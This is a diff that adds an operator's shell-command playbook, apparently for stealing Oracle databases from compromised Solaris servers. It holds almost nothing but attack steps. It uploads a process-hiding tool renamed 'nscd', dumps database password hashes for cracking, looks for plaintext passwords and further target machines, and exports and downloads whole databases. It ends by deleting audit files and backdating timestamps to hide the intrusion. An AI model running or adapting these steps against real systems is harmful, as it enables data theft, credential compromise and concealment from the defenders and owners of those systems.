@@ -1,0 +1,545 @@
+###############################################
+# Make sure that we have enough space in /tmp #
+###############################################
+df -k | egrep 'tmp|avail'
+
+###########################
+# Make the temp directory #
+###########################
+mkdir $TMPDIR
+chmod 777 $TMPDIR
+-cd $TMPDIR
+
+
+##########################################
+# Add the current directory to your path #
+##########################################
+-addpath .
+
+
+################################################
+# Verify the home directory of the oracle user #
+################################################
+grep oracle /etc/passwd | awk -F: '{print $6}'
+
+#########################################################################
+# Make sure that we setup the correct environment variable for NLS_LANG.#
+# Look in the $HOMEDIR directory for a .profile, .cshrc, 	#
+# or whatever file bash uses.						#
+#########################################################################
+-lt $HOMEDIR
+-vget $HOMEDIR/.profile
+-vget $HOMEDIR/.cshrc
+
+#########################################################################
+# Grab the .ora configuration files or at least the tnsnames.ora and 	#
+# listener.ora files at a minimum.  The tnsnames.ora file will identify #
+# all of the oracle servers that this machine knows about.  		#
+# *** Look at this file to identify additional machines to go after.	#
+#########################################################################
+-lt $ORACLEHOMEDIR/network/admin
+-get $ORACLEHOMEDIR/network/admin/*.ora
+
+
+##################################################################
+#  At this point you need to look in these files to see if there #
+#  is an NLS_LANG parameter set.  If there is, then you need to  #
+#  edit the t0, g1, and g2 files to set this parameter correctly #
+#  before you upload any of these files.			 #
+##################################################################
+
+##############################################
+# Upload the files that should ALWAYS be run #
+##############################################
+-put /current/up/oracle/t0 $TMPDIR/t0
+-put /current/up/oracle/t0.sql $TMPDIR/t0.sql
+-put /current/up/oracle/g1 $TMPDIR/g1
+-put /current/up/oracle/r1.sql $TMPDIR/r1.sql
+-put /current/up/oracle/idb.sql $TMPDIR/idb.sql
+
+#######################
+# Upload one of these #
+#######################
+-put /current/up/oracle/t1_full_survey.sql $TMPDIR/t1.sql
+-put /current/up/oracle/t1_schema_only.sql $TMPDIR/t1.sql
+-put /current/up/oracle/t1_sample_only.sql $TMPDIR/t1.sql
+-put /current/up/oracle/t1_no_survey.sql $TMPDIR/t1.sql
+
+
+
+
+######################################################################
+#################### BEGIN INCISION TARGETS ONLY #####################
+######################################################################
+
+#####################
+# Upload DITTLELITE #
+#####################
+#########################################################################
+# This is required for unhiding our processes on an INCISION box.	#
+# Oracle requires that it see our processes when we query the database. #
+#########################################################################
+-put /current/up/hidelite.solaris.sparc $TMPDIR/nscd
+
+
+######################################################################
+####################  END INCISION TARGETS ONLY  #####################
+######################################################################
+
+
+
+
+#################################################################
+# We need to set permissions on the files so that the "oracle"	#
+# user will be able to see them in the temp directory.          #
+#################################################################
+chmod 777 *
+
+
+
+##################################################
+# Make sure we are using the correct UID and GID #
+##################################################
+-get /etc/group
+grep oracle /etc/passwd | awk -F: '{print $3}'
+grep dba /etc/group | awk -F: '{print $3}'
+
+
+####################################################################
+# Setup the Oracle environment variables needed to run the queries #
+####################################################################
+-setenv ORACLE_BASE=$ORACLEBASEDIR
+-setenv ORACLE_HOME=$ORACLEHOMEDIR
+-setenv ORACLE_SID=$ORACLESID
+
+
+
+######################################################
+# Unhide yourself before running the queries!!!      #
+#   If INCISION: use DITTLELITE (instructions below) #
+#   If STOIC: use ctrl -P (instructions below)       #
+######################################################
+
+
+
+######################################################################
+#################### BEGIN INCISION TARGETS ONLY #####################
+######################################################################
+-pid
+
+##############################################################
+# IMPORTANT!!!  The PPID MUST be (1).  This window MUST be a #
+# callback window in order for DITTLELITE to work properly.  #
+##############################################################
+ 
+###########################################################
+# Use the PID of the callback window in the command below #
+###########################################################
+./nscd -u -p <pid>
+echo $?
+
+######################################################################
+####################  END INCISION TARGETS ONLY  #####################
+######################################################################
+
+
+
+
+
+######################################################################
+################## BEGIN STOICSURGEON TARGETS ONLY ###################
+######################################################################
+ps -ef | grep pmon
+
+#########################################################################
+# Use the PID of the ora_pmon_$ORACLESID process in the command below	#
+#########################################################################
+-ctrl -P <PID>
+
+######################################################################
+##################  END STOICSURGEON TARGETS ONLY  ###################
+######################################################################
+
+
+
+
+
+#################################################################
+# setup the Environment variables for the UID and GID to run as #
+#################################################################
+-setenv U=$UID
+-setenv G=$GID
+
+
+
+#########################################################################
+# List the audit directory prior to running scripts.  Any files created #
+# after doing the survey, will need to be deleted prior to leaving the  #
+# target.  								#
+#########################################################################
+ls -alrt $ORACLEHOMEDIR/rdbms/audit/*.aud | tail
+
+#############################################
+# If the above fails, then use this command #
+#############################################
+cd $ORACLEHOMEDIR/rdbms/audit;  ls -alrt | tail -10
+
+
+############################################################
+# Test out everything to make sure we have the correct IDs #
+############################################################
+id
+
+####################################
+# Start running the Oracle queries #
+# **** ALWAYS RUN THIS QUERY ****  #
+####################################
+t0
+
+#################################################################################
+# At this point, you may want to grab the Oracle passwords that were displayed	#
+# to the screen and send them off to be cracked.  If they crack easily, then 	#
+# you can use them with the "mkall.sh" script below to be able to export the 	#
+# entire database for the user.  You really only need to have the ones cracked	#
+# that are for the users of interest (this list should also be on the screen).	#
+#################################################################################
+
+###############################################
+# Send passwords off to be cracked (optional) #
+###############################################
+-vget pass.txt
+-rm pass.txt
+
+
+##################################################################
+### Change this entry from what was received back from running ###
+### the "t0" script or from what was in the ".profile"         ###
+##################################################################
+################################
+##### Configured by script #####
+################################
+-setenv NLS_LANG=AMERICAN_AMERICA.$CHARACTERSET
+
+#################################################
+##### Potential Simplified Chinese Settings #####
+#################################################
+-setenv NLS_LANG=AMERICAN_AMERICA.ZHS16CGB231280
+-setenv NLS_LANG=AMERICAN_AMERICA.ZHS16GBK
+
+#####################################
+##### Potential Arabic Settings #####
+#####################################
+-setenv NLS_LANG=AMERICAN_AMERICA.AR8MSWIN1256
+
+
+#################################################
+#  Get the $HOSTNAME$ORACLESID_idb.txt file	#
+#################################################
+g1 > /dev/null 2>&1
+-vget $HOSTNAME$ORACLESID_idb.txt
+-vget $HOSTNAME_$ORACLESID_idb.txt  # might be named this
+
+
+#################################################################################
+# 	REVIEW the $HOSTNAME$ORACLESID_idb.txt file.  				#
+#		These are the things to look for:				#
+#################################################################################
+#  - Is auditing on?  This should show up in the first section of the file.	#
+#	Also look for the "audit_trail" setting in the "DB Initialization 	#
+#	Parameters" section.							#
+#										#
+#  - How much data is being stored for the users you want to get sample 	#
+#	data for?  Look for section: "Database Usage by User and Tablespace"	#
+#	If the sizes are too big (>500,000K) SERIOUSLY consider not getting 	#
+#	sample data, just get the schema.  To do this, run the command:		#
+#										#
+#		/current/up/oracle/mkr2_schema.sh <USER>  > r2.sql 		#
+#										#
+# 	and then upload it and overwrite the one on the target.			#
+#										#
+#  - See if you can identify some plaintext passwords.  Look at the 		#
+#	"Database Links" section.						#
+#										#
+#  - Identify the database users you are interested in.  Look at the "Users	#
+#	of Interest" section.  These users are also included in the 		#
+#	"sam8i.txt" or the "sam80.txt" file that was created when you ran t0.	#
+#										#
+#################################################################################
+
+
+
+
+###################################################
+##### Skip this section if not doing a survey #####
+###################################################
+
+
+
+###################################################################################
+###############################  IF DOING A SURVEY  ###############################
+###################################################################################
+
+-pid
+
+
+#########################
+# Upload Survey Scripts #
+#########################
+-put /current/up/oracle/g2 $TMPDIR/g2
+-put /current/up/oracle/s1.sql $TMPDIR/s1.sql
+-put /current/up/oracle/sch.sql $TMPDIR/sch.sql
+
+
+#################################################
+# Upload only one of the following five scripts #
+#################################################
+################################################################
+# If Tables are partitioned (see $HOSTNAME$ORACLESID_idb.txt ) #
+################################################################
+-put /current/up/oracle/s2_partition.sql $TMPDIR/s2.sql
+-put /current/up/oracle/s2_partition_no_counts.sql $TMPDIR/s2.sql
+#################################
+# If Tables are not partitioned #
+#################################
+-put /current/up/oracle/s2_nopartition.sql $TMPDIR/s2.sql
+-put /current/up/oracle/s2_nopartition_no_counts.sql $TMPDIR/s2.sql
+-put /current/up/oracle/s2_onlyrowcounts.sql $TMPDIR/s2.sql
+
+
+
+####################################################################
+# In another window as root, set permissions on the survey scripts #
+####################################################################
+cd $TMPDIR; chmod 777 g2 s1.sql s2.sql sch.sql
+
+
+
+#######################################################
+# Grab the script file that will give us the commands #
+# to run for getting sample data.		      #
+# Usually, you only need to grab the sam8i.txt file.  #
+#######################################################
+-vget sam8i.txt
+-vget sam80.txt
+
+#################################################################
+#  At this point you need to look at the sam8i.txt or sam80.txt #
+#  file to perform the survey of each of the users.  Use the 	#
+#  sam8i.txt file unless you are on an Oracle 8.0 server.	#
+#################################################################
+
+
+
+#########################################################################
+#  If you want to just get the schema and not the sample data for a 	#
+#  USER, then run the "mkr2_schema.sh" script.  Else, if you originally #
+#  uploaded the "t1_schema.sql" file instead of the "t1_fullsurvey.sql" #
+#  file before running the "t0" script and would like to get a sample   #
+#  of the data too, then run the "mkr2sql.sh" script: 			#
+#########################################################################
+#  You will need to put up this file in place of the "mv" line in the	#
+#  sam8i.txt or sam80.txt file.						#
+#########################################################################
+/current/up/oracle/mkr2_schema.sh <USER>  > /curent/up/oracle/r2.sql
+/current/up/oracle/mkr2sql.sh <USER>  > /current/up/oracle/r2.sql
+
+-put /current/up/oracle/r2.sql $TMPDIR/r2.sql
+
+# In another window as root, set the permissions of the new files if needed
+chmod 777 $TMPDIR/*
+
+
+#################################
+# *** End of survey section *** #
+#################################
+
+
+
+#########################################################
+##### Skip this section if not doing custom queries #####
+#########################################################
+
+
+
+###################################################################################
+############################  IF DOING CUSTOM QUERIES  ############################
+###################################################################################
+#######################
+# Create Custom Query #
+#######################
+/current/up/oracle/mkquery.sh $USER > /current/up/oracle/custom.sql
+
+#########################
+# Edit the Custom Query #
+#########################
+vi /current/up/oracle/custom.sql
+
+#######################
+# Upload Custom Query #
+#######################
+-put /current/up/oracle/custom.sql $TMPDIR/r4.sql
+-put /current/up/oracle/g4 $TMPDIR/g4
+
+# In another window as root:
+chmod 777 $TMPDIR/*
+
+
+#################
+# Run the query #
+#################
+g4
+
+-get cust_$USER.txt
+-rm cust_$USER.txt
+
+-rm g4
+-rm r4.sql
+
+
+#######################################
+# *** End of custom query section *** #
+#######################################
+
+
+
+
+#################################################
+# *** Skip this section if not doing export *** #
+#################################################
+
+#########################################################################
+# If you want to generate the scripts need to export a different user,  #
+# then run the "mkall.sh" script for the user you want.			#
+#########################################################################
+# USAGE:  ./makall.sh <USER> <PASSWORD> <ORACLESID> <naming> <TMPDIR>   #
+#########################################################################
+# EXAMPLE:  								#
+# 	./mkall.sh DB_User DB_Pass $ORACLESID "" $TMPDIR 		#
+#							 		#
+# PRODUCES FILES:					 		# 
+# 	DB_User_user, DB_User_exp_script, DB_User_sch, 	 		#
+# 	exp_DB_User, exp_DB_User_sch, g3, r3.sql	 		#
+#########################################################################
+# EXAMPLE:  								#
+# 	./mkall.sh DB_User DB_Pass $ORACLESID _1 $TMPDIR		#
+#									#
+# PRODUCES FILES:							# 
+# 	DB_User_1_user, DB_User_exp_script, DB_User_sch,		#
+# 	exp_DB_User_1, exp_DB_User_sch, g3, r3.sql			#
+#########################################################################
+#####################################################################################
+# Run the mkall.sh script to create the sql scripts for exporting a particular user #
+#####################################################################################
+cd /current/up/oracle
+./mkall.sh $USER $USERPASS $ORACLESID "" $TMPDIR
+
+############################################################
+# Open up the $USER_exp_script file for running the export #
+############################################################
+vi $USER_exp_script
+
+
+##################################################
+# Upload the Export scripts (if doing an export) #
+##################################################
+-put /current/up/oracle/exp_$USER_sch $TMPDIR/exp_$USER_sch
+-put /current/up/oracle/$USER_sch $TMPDIR/$USER_sch
+-put /current/up/oracle/exp_$USER $TMPDIR/exp_$USER
+-put /current/up/oracle/$USER_user $TMPDIR/$USER_user
+
+# In another window as root:
+chmod 777 $TMPDIR/*
+
+
+#####################
+# Export the Schema #
+#####################
+exp_$USER_sch
+-vget exp_$USER_sch.txt
+-get $USER_sch.dmp
+
+##############################
+# Export the Entire Database #
+##############################
+exp_$USER > exp_$USER.txt
+-vget exp_$USER.txt
+-get $USER.dmp
+
+
+#################################
+# *** End of Export section *** #
+#################################
+
+
+
+
+
+
+#####################################
+########## CLEANUP SECTION ##########
+#####################################
+
+
+########################################################
+# Clear environment variables that set the UID and GID #
+# to be root again.                                    #
+########################################################
+-setenv U=
+-setenv G=
+
+
+#######################
+# Hide yourself again #
+#######################
+###################
+# INCISION target #
+###################
+./nscd -h -p ????
+
+#######################
+# STOICSURGEON target #
+#######################
+ps -aef | grep pmon
+
+###################################################
+# Use the PID of the ora_pmon_$ORACLESID	  #
+# process in the command below			  #
+###################################################
+-ctrl -p <PID>
+
+###########################################################
+# Clean up the audit trail - delete the files we created. #
+###########################################################
+ls -alrt $ORACLEHOMEDIR/rdbms/audit/*.aud | tail
+
+#############################################
+# If the above fails, then use this command #
+#############################################
+cd $ORACLEHOMEDIR/rdbms/audit;  ls -alrt | tail -10
+
+
+
+#################################################
+# Touch up the date/timestamp of the directory  #
+# -touch referencefile filetotouch		#
+#################################################
+-touch $ORACLEHOMEDIR/rdbms/audit/ora_???.aud $ORACLEHOMEDIR/rdbms/audit
+ 
+#####################################
+# Clean up the $TMPDIR directory #
+#####################################
+rm $TMPDIR/*
+-cd /tmp   
+-rm $TMPDIR 
+
+###########################################
+# Move the files from the temp directory  #
+#   so that they can be post processed	  #
+###########################################
+###########################################
+######    RUN THESE LOCALLY!!!!!!    ######
+###########################################
+mkdir /current/down/$HOST_IPADDRESS/ORACLE
+mv /current/down/$HOST_IPADDRESS$TMPDIR/* /current/down/$HOST_IPADDRESS/ORACLE
+ls -la /current/down/$HOST_IPADDRESS/ORACLE
+
